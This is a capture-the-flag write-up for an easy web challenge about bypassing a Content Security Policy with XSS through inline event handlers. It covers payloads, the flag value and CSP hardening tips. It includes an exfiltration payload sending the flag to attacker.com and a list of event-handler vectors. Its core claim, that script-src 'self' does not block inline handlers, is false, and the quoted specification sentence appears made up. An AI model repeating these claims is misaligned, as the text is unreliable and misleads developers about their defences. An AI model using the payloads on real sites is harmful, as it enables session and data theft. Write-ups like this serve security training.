# Siren's Script

## Challenge Information
- **Category:** Web
- **Difficulty:** Easy
- **Author Name:** Sofia Asif

## Challenge Description
This challenge exploits a common misconception about Content Security Policy (CSP). While the CSP blocks inline `<script>` tags, it doesn't prevent inline event handlers, allowing attackers to execute arbitrary JavaScript and steal sensitive data.

## Background: Understanding CSP

### What is Content Security Policy?

Content Security Policy (CSP) is a security mechanism that helps prevent Cross-Site Scripting (XSS) attacks by controlling which resources can be loaded and executed on a web page.

### The CSP Header

The challenge uses the following CSP:

```
Content-Security-Policy: script-src 'self'
```

**What this means:**
- `script-src 'self'` - Only allows scripts from the same origin
- Blocks inline `<script>` tags (no `'unsafe-inline'` directive)
- Blocks `eval()` and similar dynamic code execution
- **Does NOT block inline event handlers** ❌

## The Vulnerability

### Common Misconception

Many developers believe that `script-src 'self'` completely prevents inline JavaScript execution. However, **inline event handlers are NOT blocked** by this CSP directive unless `'unsafe-inline'` is explicitly forbidden or you use CSP Level 3 with strict policies.

### What Works vs What Doesn't

**❌ Blocked by CSP:**
```html
<script>alert('XSS')</script>
```

**✅ Allowed by CSP:**
```html
<img src=x onerror="alert('XSS')">
<body onload="alert('XSS')">
<a href="#" onclick="alert('XSS')">Click</a>
<input onfocus="alert('XSS')" autofocus>
<svg onload="alert('XSS')">
```

## Challenge Analysis

### The Note Application

Based on the code structure, this appears to be a note-taking application where:
1. Users can create/view notes
2. The flag is stored somewhere in the application (`FLAG` constant)
3. There's likely an XSS vulnerability in the note rendering
4. The CSP header is meant to "protect" against XSS

### The Goal

Extract the flag by bypassing the CSP protection and executing JavaScript to access the flag data.

## Exploitation Steps

### Step 1: Identify the Injection Point

Look for places where user input is rendered in the note application. Common injection points:
- Note title field
- Note content/body
- Search functionality
- URL parameters

### Step 2: Test Basic XSS Payloads

First, verify that inline scripts are blocked:

```html
<script>alert(1)</script>
```

Expected result: CSP blocks this and you'll see an error in the browser console:
```
Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self'"
```

### Step 3: Bypass with Inline Event Handlers

Use an inline event handler instead:

```html
<img src=x onerror="alert(1)">
```

**Success!** The alert fires because event handlers are not blocked by the CSP.

### Step 4: Craft the Flag Extraction Payload

Now that we can execute JavaScript, we need to extract the flag. Based on the code, the `FLAG` constant is available in the application scope.

**Payload options:**

**Option 1: Display in alert**
```html
<img src=x onerror="alert(FLAG)">
```

**Option 2: Exfiltrate to external server**
```html
<img src=x onerror="fetch('https://attacker.com/log?flag='+FLAG)">
```

**Option 3: Display in DOM**
```html
<img src=x onerror="document.body.innerHTML=FLAG">
```

**Option 4: Console log**
```html
<img src=x onerror="console.log(FLAG)">
```

### Step 5: Submit the Payload

1. Create a new note with the payload in the title or content
2. Save/view the note
3. The JavaScript executes and reveals the flag

## Complete Exploit

### Method 1: Simple Alert
```html
<img src=x onerror="alert(FLAG)">
```

### Method 2: SVG onload (cleaner)
```html
<svg onload="alert(FLAG)">
```

### Method 3: Input autofocus
```html
<input onfocus="alert(FLAG)" autofocus>
```

### Method 4: Body onload (if you can inject into body)
```html
<body onload="alert(FLAG)">
```

## Proof of Concept

1. Navigate to the note application
2. Create a new note
3. Enter payload in the note content:
   ```html
   <img src=x onerror="alert(FLAG)">
   ```
4. Save and view the note
5. Alert popup displays: `SAVVY{c$p_1$_n07_4_$11v3r_8u1137_1n11n3_h4nd13r$_ph7w}`

## Flag
```
SAVVY{c$p_1$_n07_4_$11v3r_8u1137_1n11n3_h4nd13r$_ph7w}
```

**Flag Translation:** "CSP is not a silver bullet, inline handlers FTW" (For The Win)

## Key Takeaways

### The Vulnerability
- **CSP `script-src` does not block inline event handlers** by default
- Developers often assume CSP provides complete XSS protection
- Event handlers like `onerror`, `onload`, `onclick`, `onfocus` bypass basic CSP

### Why This Happens
From the [CSP specification](https://www.w3.org/TR/CSP/):
> "Event handler content attributes (e.g., onclick) are not directly blocked by script-src, as they are not treated as inline scripts"

### Secure CSP Configuration

**❌ Weak (Challenge CSP):**
```
Content-Security-Policy: script-src 'self'
```

**✅ Better:**
```
Content-Security-Policy: script-src 'self'; default-src 'self'
```

**✅ Strong (blocks inline handlers):**
```
Content-Security-Policy: script-src 'nonce-{random}'; default-src 'self'
```

**✅ Strongest (CSP Level 3):**
```
Content-Security-Policy: 
  script-src 'nonce-{random}' 'strict-dynamic'; 
  object-src 'none'; 
  base-uri 'none';
  require-trusted-types-for 'script'
```

### Defense in Depth

1. **Use strict CSP with nonces/hashes** - Forces all scripts to be explicitly allowed
2. **Enable Trusted Types** - Prevents DOM XSS at the API level
3. **Sanitize user input** - Never trust user-provided content
4. **Use modern frameworks** - React, Vue, Angular have built-in XSS protection
5. **Content encoding** - Properly encode output based on context (HTML, JS, URL, CSS)

### Additional Event Handlers to Know

Here are common event handlers that bypass basic CSP:

```html
<img src=x onerror="...">
<svg onload="...">
<body onload="...">
<input onfocus="..." autofocus>
<marquee onstart="...">
<video onloadstart="...">
<audio onloadstart="...">
<iframe onload="...">
<object onerror="...">
<details ontoggle="..." open>
```

## Challenge Name Meaning

**"Siren's Script"** is a clever reference to:
- **Siren** - In Greek mythology, sirens lured sailors to their doom with enchanting songs
- **Script** - JavaScript/inline event handlers
- The challenge "lures" developers into a false sense of security with CSP, only for inline event handlers to bypass it

The CSP appears safe (like a siren's beautiful song), but it's actually dangerous (leading to XSS).

---

**Lesson Learned:** CSP is a powerful defense-in-depth mechanism, but it's not a silver bullet. Always combine CSP with proper input validation, output encoding, and modern security APIs like Trusted Types.